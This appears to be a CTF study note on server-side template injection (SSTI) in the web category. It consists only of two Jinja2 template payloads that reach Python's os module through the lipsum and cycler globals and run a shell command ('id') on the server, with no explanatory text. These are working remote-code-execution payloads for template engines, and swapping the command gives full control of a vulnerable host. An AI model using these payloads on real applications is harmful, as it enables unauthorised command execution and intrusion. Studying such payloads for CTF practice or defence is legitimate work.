# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/SSTI.md
# TITLE: SSTI（服务器端模板注入）
# CATEGORY: web

{% set ns = namespace(f='') %}
{% set ns.f = lipsum.__globals__['os'].popen('id').read() %}
{{ns.f}}

{% set ns = namespace(f='') %}
{% set ns.f = cycler.__init__.__globals__['os'].popen('id').read() %}
{{ns.f}}
